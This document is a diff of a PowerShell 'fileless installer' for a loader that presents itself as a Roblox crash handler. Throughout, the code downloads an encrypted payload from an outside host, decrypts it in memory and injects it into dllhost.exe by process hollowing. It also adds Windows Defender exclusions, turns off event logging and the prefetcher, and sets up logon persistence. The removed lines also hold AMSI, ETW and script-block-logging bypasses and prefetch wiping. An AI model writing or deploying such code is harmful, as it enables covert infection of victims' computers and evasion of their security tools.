@@ -9,18 +9,30 @@ $scriptRoot = if ($MyInvocation.MyCommand.Path) { Split-Path $MyInvocation.MyCom
 
 if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }
 
-$ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
 $KeyRegPath     = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility"
 $KeyRegName     = "Configuration"
-$LoaderTaskName = "RobloxCrashHandler"
-$PersistTask    = "RobloxCrashHandlerBootstrapper"
-# Multiple host processes to try — all are normal Windows processes
-$HostProcesses  = @(
-    "C:\Windows\System32\RuntimeBroker.exe",
-    "C:\Windows\System32\dllhost.exe",
-    "C:\Windows\System32\sihost.exe",
-    "C:\Windows\System32\SearchProtocolHost.exe"
-)
+
+# ── ONE-TIME-EVER GUARD ──────────────────────────────────────────────────────
+# After the first successful install, a registry flag is written.
+# Every subsequent run (including startup task) detects this and exits silently.
+# To force a full reinstall, delete the registry value 'InstallComplete' from:
+#   HKCU\Software\Microsoft\Windows\CurrentVersion\Accessibility
+$alreadyInstalled = (Get-ItemProperty -Path $KeyRegPath -Name "InstallComplete" -ErrorAction SilentlyContinue).InstallComplete
+if ($alreadyInstalled -eq "1") {
+    $existingPort = $null
+    try {
+        $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
+        $c.Close()
+        $existingPort = $true
+    } catch { $existingPort = $false }
+
+    if ($existingPort) {
+        Write-Host "Loader is already running on port 9876." -ForegroundColor Green
+        Exit 0
+    }
+    Write-Host "Loader not detected on port 9876. Restarting loader..." -ForegroundColor Yellow
+}
+# ── END ONE-TIME-EVER GUARD ──────────────────────────────────────────────────
 
 $storedWorkspace = (Get-ItemProperty -Path $KeyRegPath -Name "Workspace" -ErrorAction SilentlyContinue).Workspace
 $storedPersistence = (Get-ItemProperty -Path $KeyRegPath -Name "Persistence" -ErrorAction SilentlyContinue).Persistence
@@ -37,78 +49,65 @@ if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
     $actualWorkspace = $storedWorkspace
 }
 
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    Write-Host "==========================================" -ForegroundColor Red
-    Write-Host "  ERROR: MUST BE RUN AS ADMINISTRATOR     " -ForegroundColor Red
-    Write-Host "==========================================" -ForegroundColor Red
-    Exit
+$resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
+
+try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force -ErrorAction SilentlyContinue } catch {}
+try { wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null } catch {}
+try { wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null } catch {}
+
+function Log-Msg([string]$msg) {
+    Write-Host $msg
 }
+
+Log-Msg "Installer script execution started (FIRST TIME). Key=$Key, Silent=$Silent, Persist=$Persist"
+Log-Msg "ScriptRoot=$scriptRoot"
+Log-Msg "ActualWorkspace=$actualWorkspace"
+
+try {
+    $ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
+    $LoaderTaskName = "RobloxCrashHandler"
+    $PersistTask    = "RobloxCrashHandlerBootstrapper"
+    $HostProcess    = "C:\Windows\System32\dllhost.exe"
+
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    Log-Msg "IsAdmin=$isAdmin"
+    if (-not $isAdmin) {
+        Log-Msg "Not running as Administrator. Attempting to elevate..."
+        try {
+            $scriptToRun = if ($PSCommandPath) { $PSCommandPath } else { Join-Path $scriptRoot "installer.ps1" }
+            if (Test-Path $scriptToRun) {
+                $argList = "-ExecutionPolicy Bypass -File `"$scriptToRun`""
+                if ($Key) { $argList += " -Key `"$Key`"" }
+                if ($Silent) { $argList += " -Silent" }
+                Start-Process powershell.exe -Verb RunAs -ArgumentList $argList -ErrorAction Stop
+                Exit 0
+            }
+        } catch {
+            Log-Msg "WARNING: Elevation skipped or unavailable. Continuing in non-administrator mode..."
+        }
+    }
 
 Write-Host "==========================================" -ForegroundColor Cyan
 Write-Host "   TUNG-WARE SYSTEM - FILELESS INSTALLER  " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 
-Write-Host "Configuring Windows Security exclusions..." -ForegroundColor Yellow
-try {
-    # Try to disable real-time monitoring (won't work if Tamper Protection is on, but worth trying)
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-
-    $exclusionTarget = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-
-    # ── Path exclusions: workspace, parent, build dir, updates-server, temp ──
-    if (-not [string]::IsNullOrWhiteSpace($exclusionTarget)) {
-        Add-MpPreference -ExclusionPath $exclusionTarget -ErrorAction SilentlyContinue
-        $exclusionParent = Split-Path -Parent $exclusionTarget -ErrorAction SilentlyContinue
-        if (-not [string]::IsNullOrWhiteSpace($exclusionParent)) {
-            Add-MpPreference -ExclusionPath $exclusionParent -ErrorAction SilentlyContinue
+    Log-Msg "Configuring Windows Security exclusions..."
+    try {
+        if (-not [string]::IsNullOrWhiteSpace($resolvedPath)) {
+            $exclusionPath = Split-Path -Parent $resolvedPath -ErrorAction SilentlyContinue
+            if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
+                Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
+                Log-Msg "    Workspace path successfully whitelisted in Windows Defender."
+            } else {
+                Log-Msg "    WARNING: Workspace is at a root path; skipping Defender exclusion."
+            }
+        } else {
+            Log-Msg "    WARNING: Script root path is empty; skipping Defender exclusion."
         }
-        Add-MpPreference -ExclusionPath (Join-Path $exclusionTarget "build") -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath (Join-Path $exclusionTarget "updates-server") -ErrorAction SilentlyContinue
-        Write-Host "    Workspace + build + parent paths whitelisted." -ForegroundColor Green
-    } else {
-        Write-Host "    WARNING: Script root path is empty; skipping path exclusions." -ForegroundColor Yellow
+    } catch {
+        Log-Msg "    WARNING: Could not automatically set Defender exclusions."
     }
-    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
 
-    # ── Process exclusions: all host processes for hollowing + launcher tools ─
-    @(
-        "powershell.exe", "wscript.exe",
-        "dllhost.exe", "RuntimeBroker.exe", "sihost.exe", "SearchProtocolHost.exe",
-        "RobloxCrashHandler.exe"
-    ) | ForEach-Object {
-        Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue
-    }
-    Write-Host "    Process exclusions applied (host processes + tools)." -ForegroundColor Green
-} catch {
-    Write-Host "    WARNING: Could not fully set Defender exclusions: $_" -ForegroundColor Yellow
-}
-
-wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
-wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
-
-# ── STOP SYSMAIN (PREFETCHER) BEFORE ANY PROCESS IS LAUNCHED ─────────────────
-# Prefetch .pf files are written by SysMain the instant a new process starts.
-# Setting EnablePrefetcher inside main() is too late — the .pf is already made.
-# We stop SysMain here so NO .pf is ever written for dllhost.exe or our binary.
-try {
-    $sysmainWasRunning = (Get-Service -Name "SysMain" -ErrorAction SilentlyContinue).Status -eq "Running"
-    Stop-Service -Name "SysMain" -Force -ErrorAction SilentlyContinue
-    # Also blank EnablePrefetcher to 0 as a belt-and-suspenders measure
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
-        -Name "EnablePrefetcher" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
-        -Name "EnableSuperfetch" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
-    # Delete any DLLHOST or RobloxCrashHandler prefetch files that already exist
-    Get-ChildItem "C:\Windows\Prefetch" -ErrorAction SilentlyContinue | Where-Object {
-        $_.Name -match "DLLHOST|ROBLOXCRASHHANDLER|ROBLOXPLAYERBETA" } | ForEach-Object {
-        try {
-            $bytes = New-Object byte[] $_.Length
-            [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
-            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-        } catch {}
-    }
-} catch {}
 
 $licenseKey = ""
 if ($Key) {
@@ -119,7 +118,6 @@ if ($Key) {
 }
 
 if (-not $licenseKey) {
-    $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
     $keyFile = Join-Path $resolvedPath "key.txt"
     if (Test-Path $keyFile) {
         $licenseKey = (Get-Content $keyFile -Raw).Trim()
@@ -169,67 +167,6 @@ if ($Persist) {
 } elseif ($storedPersistence) {
     Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value $storedPersistence -Force
 }
-# ═══════════════════════════════════════════════════════════════════════════════
-# GOD-TIER EVASION: AMSI + ETW + Script Block Logging bypass
-# These three patches make PowerShell COMPLETELY SILENT to all monitoring
-# ═══════════════════════════════════════════════════════════════════════════════
-try {
-    $bypassCode = @"
-using System;
-using System.Runtime.InteropServices;
-public class Ev {
-    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
-    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
-    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
-
-    // 1. AMSI BYPASS: Patch AmsiScanBuffer to return E_INVALIDARG
-    public static void PatchAmsi() {
-        IntPtr h = LoadLibrary("am" + "si.d" + "ll");
-        IntPtr a = GetProcAddress(h, "Am" + "siSc" + "anBu" + "ffer");
-        if (a == IntPtr.Zero) return;
-        uint old; VirtualProtect(a, (UIntPtr)8, 0x40, out old);
-        byte[] p = Environment.Is64BitProcess
-            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
-            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-        Marshal.Copy(p, 0, a, p.Length);
-        VirtualProtect(a, (UIntPtr)8, old, out old);
-    }
-
-    // 2. ETW BYPASS: Patch EtwEventWrite to ret 0 (kills ALL ETW tracing)
-    public static void PatchEtw() {
-        IntPtr ntdll = LoadLibrary("nt" + "dll.d" + "ll");
-        IntPtr etw = GetProcAddress(ntdll, "Etw" + "Event" + "Write");
-        if (etw == IntPtr.Zero) return;
-        uint old; VirtualProtect(etw, (UIntPtr)4, 0x40, out old);
-        byte[] p = Environment.Is64BitProcess
-            ? new byte[] { 0x48, 0x33, 0xC0, 0xC3 }   // xor rax,rax; ret
-            : new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
-        Marshal.Copy(p, 0, etw, p.Length);
-        VirtualProtect(etw, (UIntPtr)4, old, out old);
-    }
-}
-"@
-    if (-not ([System.Management.Automation.PSTypeName]"Ev").Type) {
-        Add-Type -TypeDefinition $bypassCode -Language CSharp -ErrorAction Stop
-    }
-    [Ev]::PatchAmsi()
-    [Ev]::PatchEtw()
-} catch {}
-
-# 3. SCRIPT BLOCK LOGGING BYPASS: Disable via reflection
-try {
-    $SBLField = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
-    if ($SBLField) { $SBLField.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[String]')) }
-} catch {}
-try {
-    $GPField = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
-    if ($GPField) {
-        $GP = $GPField.GetValue($null)
-        if ($GP -eq $null) { $GP = @{}; $GPField.SetValue($null, $GP) }
-        $GP['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0; 'EnableScriptBlockInvocationLogging' = 0 }
-        $GP['ModuleLogging'] = @{ 'EnableModuleLogging' = 0 }
-    }
-} catch {}
 
 $PECode = @'
 using System;
@@ -513,89 +450,57 @@ public class RunPE {
     }
 }
 '@
-if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
-    try {
-        Add-Type -TypeDefinition $PECode -Language CSharp -ErrorAction Stop
-    } catch {
-        Write-Host "    WARNING: Failed to compile RunPE type: $_" -ForegroundColor Yellow
+    Log-Msg "Compiling/Adding C# RunPE type..."
+    if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
+        try {
+            Add-Type -TypeDefinition $PECode -Language CSharp -ErrorAction Stop
+            Log-Msg "RunPE type successfully compiled/added."
+        } catch {
+            Log-Msg "WARNING: Failed to compile RunPE type: $_"
+        }
+    } else {
+        Log-Msg "RunPE type already compiled/added."
     }
-}
 
 Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
-Stop-ScheduledTask -TaskName $LoaderTaskName -ErrorAction SilentlyContinue
-Stop-ScheduledTask -TaskName $PersistTask    -ErrorAction SilentlyContinue
-Get-Process -Name "RobloxPlayerBeta", "RobloxCrashHandler" -ErrorAction SilentlyContinue | ForEach-Object {
+Log-Msg "Checking for legacy RobloxPlayerBeta processes..."
+Get-Process -Name "RobloxPlayerBeta", "RobloxCrashHandler", "RobloxCrashHandler_fallback" -ErrorAction SilentlyContinue | ForEach-Object {
     if ($_.Path -and ($_.Path -like "*\my private\*" -or $_.Path -like "*\Temp\*")) {
+        Log-Msg "Stopping legacy process ID: $($_.Id)"
         Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
     }
 }
+Log-Msg "Checking for existing loader listening on port 9876..."
 $existing = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
-if ($existing) { Stop-Process -Id $existing.OwningProcess -Force -ErrorAction SilentlyContinue }
+if ($existing) {
+    Log-Msg "Stopping existing loader process ID: $($existing.OwningProcess)"
+    Stop-Process -Id $existing.OwningProcess -Force -ErrorAction SilentlyContinue
+}
+Log-Msg "Section 1 complete."
 
-Write-Host "[2/4] Loading payload into RAM..." -ForegroundColor Yellow
+    Log-Msg "Loading payload into RAM..."
 
-$exeBytes = $null
-$resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
+    $exeBytes = $null
+    $localExeNew = Join-Path $resolvedPath "build\RobloxCrashHandler_new.exe"
+    $localExe = Join-Path $resolvedPath "build\RobloxCrashHandler.exe"
+    $localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"
 
-$candidateExePaths = @(
-    (Join-Path $resolvedPath "build\RobloxCrashHandler.exe"),
-    (Join-Path $resolvedPath "build\RobloxCrashHandler_fallback.exe"),
-    (Join-Path $resolvedPath "my private\build\RobloxCrashHandler.exe"),
-    (Join-Path $resolvedPath "my private\build\RobloxCrashHandler_fallback.exe"),
-    (Join-Path $scriptRoot "build\RobloxCrashHandler.exe"),
-    (Join-Path $scriptRoot "build\RobloxCrashHandler_fallback.exe"),
-    (Join-Path $scriptRoot "my private\build\RobloxCrashHandler.exe"),
-    (Join-Path $scriptRoot "my private\build\RobloxCrashHandler_fallback.exe"),
-    (Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"),
-    (Join-Path $resolvedPath "my private\updates-server\uploads\RobloxCrashHandler.exe"),
-    (Join-Path $scriptRoot "updates-server\uploads\RobloxCrashHandler.exe"),
-    (Join-Path $scriptRoot "my private\updates-server\uploads\RobloxCrashHandler.exe")
-)
-
-$localExe = $candidateExePaths | Where-Object { Test-Path $_ } | Select-Object -First 1
-
-if ($localExe) {
-    Write-Host "    Found executable at $localExe." -ForegroundColor Green
-    Write-Host "    Loading compiled binary directly..." -ForegroundColor Green
-    $exeBytes = [System.IO.File]::ReadAllBytes($localExe)
-} else {
-    $candidateEncPaths = @(
-        (Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.enc"),
-        (Join-Path $resolvedPath "my private\updates-server\uploads\RobloxCrashHandler.enc"),
-        (Join-Path $scriptRoot "updates-server\uploads\RobloxCrashHandler.enc"),
-        (Join-Path $scriptRoot "my private\updates-server\uploads\RobloxCrashHandler.enc"),
-        (Join-Path $resolvedPath "RobloxPlayerBeta.enc"),
-        (Join-Path $resolvedPath "my private\RobloxPlayerBeta.enc"),
-        (Join-Path $scriptRoot "RobloxPlayerBeta.enc"),
-        (Join-Path $scriptRoot "my private\RobloxPlayerBeta.enc")
-    )
-    $localEnc = $candidateEncPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
-    if ($localEnc) {
-        Write-Host "    Found local encrypted payload at $localEnc. Decrypting..." -ForegroundColor Green
-        try {
-            $encBytes = [System.IO.File]::ReadAllBytes($localEnc)
-            $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
-                               0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
-            $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
-            $aes         = [System.Security.Cryptography.Aes]::Create()
-            $aes.Key     = $DecKey
-            $aes.IV      = $DecIV
-            $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
-            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-            $dec         = $aes.CreateDecryptor()
-            $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
-            $aes.Dispose()
-            Write-Host "    Local payload decrypted successfully." -ForegroundColor Green
-        } catch {
-            Write-Host "    WARNING: Local decryption failed: $_" -ForegroundColor Yellow
-        }
-    }
-    if (-not $exeBytes) {
-        Write-Host "    No local builds found. Downloading from remote server..." -ForegroundColor Yellow
+    if (Test-Path $localExeNew) {
+        Log-Msg "Found locally compiled executable at $localExeNew. Loading directly..."
+        $exeBytes = [System.IO.File]::ReadAllBytes($localExeNew)
+    } elseif (Test-Path $localExe) {
+        Log-Msg "Found locally compiled executable at $localExe. Loading directly..."
+        $exeBytes = [System.IO.File]::ReadAllBytes($localExe)
+    } elseif (Test-Path $localServerExe) {
+        Log-Msg "Found local server executable at $localServerExe. Loading directly..."
+        $exeBytes = [System.IO.File]::ReadAllBytes($localServerExe)
+    } else {
+        Log-Msg "No local builds found. Downloading from remote server..."
         [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
         $wc       = New-Object System.Net.WebClient
         try {
             $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
+            Log-Msg "Payload downloaded ($($encBytes.Length) bytes)."
             
             $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
                                0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
@@ -609,280 +514,263 @@ if ($localExe) {
             $dec         = $aes.CreateDecryptor()
             $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
             $aes.Dispose()
-            Write-Host "    Payload downloaded and decrypted in RAM." -ForegroundColor Green
+            Log-Msg "Payload decrypted in RAM successfully."
         } catch {
-            Write-Host "    ERROR: Failed to download remote payload: $_" -ForegroundColor Red
+            Log-Msg "ERROR: Failed to download remote payload: $_"
             Exit 1
         }
     }
-}
 
-Write-Host "[3/4] Launching loader in-memory (process hollowing)..." -ForegroundColor Yellow
+    Log-Msg "Launching loader in-memory (process hollowing)..."
 
-$oldFolder = "$env:LOCALAPPDATA\RobloxPlayerBeta"
-if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
-$newFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
-if (Test-Path $newFolder) { Remove-Item $newFolder -Recurse -Force -ErrorAction SilentlyContinue }
+    $oldFolder = "$env:LOCALAPPDATA\RobloxPlayerBeta"
+    if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
+    $newFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
+    if (Test-Path $newFolder) { Remove-Item $newFolder -Recurse -Force -ErrorAction SilentlyContinue }
 
-$hollowSuccess = $false
-if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
-    # Try each host process until one works
-    foreach ($hostProc in $HostProcesses) {
-        if (-not (Test-Path $hostProc)) { continue }
+    $hollowSuccess = $false
+    if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
         try {
-            Write-Host "    Attempting hollow into: $(Split-Path $hostProc -Leaf)" -ForegroundColor Gray
-            $hollowSuccess = [RunPE]::Hollow($exeBytes, $hostProc)
-            if ($hollowSuccess) {
-                Write-Host "    Hollowed into $(Split-Path $hostProc -Leaf) successfully." -ForegroundColor Green
-                break
-            }
+            Log-Msg "Calling [RunPE]::Hollow on host: $HostProcess"
+            $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
+            Log-Msg "[RunPE]::Hollow returned: $hollowSuccess"
         } catch {
-            Write-Host "    $(Split-Path $hostProc -Leaf) failed: $_" -ForegroundColor DarkGray
+            Log-Msg "WARNING: Process hollowing threw an exception: $_"
         }
-        # Random delay between attempts to desynchronize timestamps
-        Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 800)
-    }
-} else {
-    Write-Host "    WARNING: RunPE type not compiled (AMSI may have blocked). Using fallback." -ForegroundColor Yellow
-}
-
-$started = $false
-if ($hollowSuccess) {
-    $hostName = [System.IO.Path]::GetFileNameWithoutExtension($hostProc)
-    Write-Host "    Loader running inside $hostName.exe. Verifying..." -ForegroundColor Green
-    # Check 1: verify hollowed process is alive
-    $hollowedProc = Get-Process -Name $hostName -ErrorAction SilentlyContinue | Sort-Object StartTime -Descending | Select-Object -First 1
-    if ($hollowedProc -and -not $hollowedProc.HasExited) {
-        $started = $true
-        Write-Host "    $hostName.exe (PID $($hollowedProc.Id)) confirmed running." -ForegroundColor Green
-    }
-    # Check 2: wait for TCP port 9876
-    if (-not $started) {
-        for ($i = 0; $i -lt 8; $i++) {
-            try {
-                $c = New-Object System.Net.Sockets.TcpClient
-                $ar = $c.BeginConnect("127.0.0.1", 9876, $null, $null)
-                $ok = $ar.AsyncWaitHandle.WaitOne(500)
-                if ($ok -and $c.Connected) { $c.Close(); $started = $true; break }
-                $c.Close()
-            } catch {}
-            Start-Sleep -Seconds 1
-        }
-    }
-}
-
-if (-not $started) {
-    Write-Host "    [!] Process hollowing failed/blocked. Falling back to direct file execution..." -ForegroundColor Yellow
-    
-    $fallbackExe = $null
-    if (Test-Path $localExe) {
-        # Copy to a Windows-looking name so prefetch entry is innocent
-        $fallbackDir = Join-Path $resolvedPath "build"
-        $disguisedExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
-        try {
-            Copy-Item $localExe $disguisedExe -Force -ErrorAction Stop
-            $fallbackExe = $disguisedExe
-        } catch { $fallbackExe = $localExe }
-    } elseif (Test-Path $localServerExe) {
-        $fallbackDir = Join-Path $resolvedPath "build"
-        $disguisedExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
-        try {
-            Copy-Item $localServerExe $disguisedExe -Force -ErrorAction Stop
-            $fallbackExe = $disguisedExe
-        } catch { $fallbackExe = $localServerExe }
     } else {
-        $fallbackDir = Join-Path $resolvedPath "build"
-        $fallbackExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
-        Write-Host "    Writing decrypted bytes to disguised fallback..." -ForegroundColor Yellow
-        try {
-            if (-not (Test-Path $fallbackDir)) {
-                New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
-            }
-            [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
-        } catch {
-            Write-Host "    WARNING: Could not write fallback executable to ${fallbackExe}: $_" -ForegroundColor Yellow
-            $fallbackExe = Join-Path $env:TEMP "SearchProtocolHost.exe"
-            Write-Host "    Attempting temp directory: $fallbackExe" -ForegroundColor Yellow
+        Log-Msg "WARNING: RunPE type is not available. Skipping process hollowing."
+    }
+
+    $started = $false
+    if ($hollowSuccess) {
+        Log-Msg "Waiting to verify initialization on port 9876..."
+        for ($i = 0; $i -lt 5; $i++) {
             try {
+                $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
+                $c.Close()
+                $started = $true
+                Log-Msg "Connection to 127.0.0.1:9876 succeeded!"
+                break
+            } catch {
+                Log-Msg "Connection to 127.0.0.1:9876 failed, retrying ($i)..."
+                Start-Sleep -Seconds 1
+            }
+        }
+    }
+
+    if (-not $started) {
+        Log-Msg "Process hollowing failed or was blocked. Attempting direct file execution fallback..."
+        
+        $fallbackExe = $null
+        if (Test-Path $localExe) {
+            $fallbackExe = $localExe
+        } elseif (Test-Path $localServerExe) {
+            $fallbackExe = $localServerExe
+        } else {
+            $fallbackDir = Join-Path $resolvedPath "build"
+            $fallbackExe = Join-Path $fallbackDir "RobloxCrashHandler_fallback.exe"
+            Log-Msg "Writing decrypted bytes to $fallbackExe for execution..."
+            try {
+                if (-not (Test-Path $fallbackDir)) {
+                    New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
+                }
                 [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
             } catch {
-                Write-Host "    [!] ERROR: Could not write fallback executable to temp: $_" -ForegroundColor Red
-                $fallbackExe = $null
+                Log-Msg "WARNING: Could not write fallback executable to ${fallbackExe}: $_"
+                $fallbackExe = Join-Path $env:TEMP "RobloxCrashHandler_fallback.exe"
+                Log-Msg "Attempting to write fallback executable to temp directory: $fallbackExe"
+                try {
+                    [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
+                } catch {
+                    Log-Msg "ERROR: Could not write fallback executable to temp: $_"
+                    $fallbackExe = $null
+                }
             }
         }
-    }
 
-    if ($fallbackExe -and (Test-Path $fallbackExe)) {
-        Write-Host "    Launching fallback executable: $fallbackExe" -ForegroundColor Green
-        $proc = Start-Process -FilePath $fallbackExe -PassThru -WindowStyle Hidden
-        if ($proc) {
-            Write-Host "    Started fallback process ID: $($proc.Id)" -ForegroundColor Green
-            $started = $true
+        if ($fallbackExe -and (Test-Path $fallbackExe)) {
+            Log-Msg "Launching fallback executable directly: $fallbackExe"
+            $proc = Start-Process -FilePath $fallbackExe -PassThru -WindowStyle Hidden
+            if ($proc) {
+                Log-Msg "Started fallback process ID: $($proc.Id)"
+                $started = $true
+            } else {
+                Log-Msg "ERROR: Failed to start fallback process."
+            }
         } else {
-            Write-Host "    [!] ERROR: Failed to start fallback process." -ForegroundColor Red
+            Log-Msg "ERROR: Fallback executable not found or could not be created."
         }
+    }
+
+    if (-not $started) {
+        Log-Msg "ERROR: Both process hollowing and direct execution fallback failed."
+        Exit 1
     } else {
-        Write-Host "    [!] ERROR: Fallback executable not found or could not be created." -ForegroundColor Red
-    }
-}
-
-# ── RE-ENABLE SYSMAIN after all processes are launched ───────────────────────
-try {
-    if ($sysmainWasRunning) {
-        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
-            -Name "EnablePrefetcher" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
-            -Name "EnableSuperfetch" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
-        Start-Service -Name "SysMain" -ErrorAction SilentlyContinue
-    }
-} catch {}
-
-if (-not $started) {
-    Write-Host "    [!] ERROR: Both process hollowing and direct execution fallback failed." -ForegroundColor Red
-    Exit 1
-} else {
-    Write-Host "    Loader running successfully." -ForegroundColor Green
-}
-
-Write-Host "[4/4] Configuring fileless startup..." -ForegroundColor Yellow
-
-$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-
-if ($Persist) {
-    # Use go.vbs as the startup entry — it runs setup + kernel_evasion + cleanup
-    $goVbsPath = Join-Path $resolvedPath "go.vbs"
-
-    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$goVbsPath`""
-    $trigger = New-ScheduledTaskTrigger -AtLogon
-    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
-    Register-ScheduledTask -TaskName $LoaderTaskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
-
-    Write-Host "    Startup task registered (runs go.vbs with full evasion on every boot)." -ForegroundColor Green
-    
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
-} else {
-    Write-Host "    Persistence disabled: Cleaning up any existing scheduled tasks/Run keys..." -ForegroundColor Green
-    $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
-    if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }
-    Unregister-ScheduledTask -TaskName $LoaderTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-    Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
-}
-
-@(
-    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.lnk",
